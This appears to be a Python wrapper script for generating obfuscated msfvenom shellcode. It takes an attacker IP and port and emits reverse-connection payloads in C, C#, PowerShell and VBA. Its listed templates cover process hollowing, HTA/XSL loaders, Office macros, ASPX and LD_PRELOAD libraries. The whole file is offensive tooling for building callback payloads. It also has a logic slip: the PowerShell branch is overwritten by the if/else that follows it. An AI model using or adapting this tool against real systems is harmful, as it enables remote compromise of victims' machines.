from temps.msfvenom import payloads
import argparse


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Generate obfuscated shellcode using msfvenom."
    )
    parser.add_argument("--ip", "-i", help="IP address")
    parser.add_argument("--format", "-f", help="Format: cs, ps vba)")
    parser.add_argument("--port", "-p", default=443, help="Port number")
    parser.add_argument("--arch", "-a", default="x64", help="Architecture: x86, x64")
    parser.add_argument(
        "--template", "-t", default="default", help="Template: default, exe etc"
    )
    parser.add_argument(
        "--conn", "-c", default="secure", help="Connection type: secure or basic"
    )
    parser.add_argument(
        "--exit", "-q", default="thread", help="Exit function: thread, process, seh"
    )
    parser.add_argument("--extra", "-x", help="Extra msfvenom arguments")
    parser.add_argument("--name", "-n", help="Filename to use or to create")
    parser.add_argument(
        "--list", "-l", action="store_true", help="Show all format and template options"
    )

    args = parser.parse_args()
    if args.list:
        list_options()
        quit()

    if not args.ip or not args.format or not args.template:
        parser.error("The following arguments are required: --ip, --format")
    elif (
        args.format == "c"
        and args.template == "so-preload"
        and not args.name
    ):
        parser.error("This template must have the name parameter")
    elif args.format in ["vba", "vba-ps"] and not args.name:
        parser.error("This format must have the name parameter")

    args.args = lowercase_args(args)

    return args


def generate_command(payload, args):
    if args.format == "ps":
        command = [
            "/usr/bin/msfvenom",
            "-f",
            "ps1",
            "-a",
            f"{args.arch}",
            "-p",
            payload,
            f"LHOST={args.ip}",
            f"LPORT={args.port}",
            f"EXITFUNC={args.exit}",
        ]
    if args.format == "c":
        command = [
            "/usr/bin/msfvenom",
            "-f",
            "c",
            "-a",
            f"{args.arch}",
            "-p",
            payload,
            f"LHOST={args.ip}",
            f"LPORT={args.port}",
        ]
    else:
        command = [
            "/usr/bin/msfvenom",
            "-f",
            "csharp",
            "-a",
            f"{args.arch}",
            "-p",
            payload,
            f"LHOST={args.ip}",
            f"LPORT={args.port}",
            f"EXITFUNC={args.exit}",
        ]

    if hasattr(args, "extra") and args.extra:
        command.extend(args.extra.split())

    print(f"Running the command: {' '.join(command)}\n")
    return command


def lowercase_args(args):
    if isinstance(args, str):
        return args.lower()
    elif isinstance(args, list):
        return [arg.lower() if isinstance(arg, str) else arg for arg in args]
    return args


def get_payload(format, arch, conn):
    if format in ["c"]:
        return payloads['linux'][arch][conn]
    else:
        return payloads['windows'][arch][conn]


def list_options():
    print(
"""Not a valid format and template, options are:
Linux:
    c      : elf, so-libpath, so-preload
Windows:
    cs     : exe, exe-ph, exe-nomigrate, dll, dll-ph, aspx
    js     : hta, xsl, hta-ph, xsl-ph
    ps     : default. ph
    vba    : default, basic
    vba-ps : default, run, exe, dll"""
    )
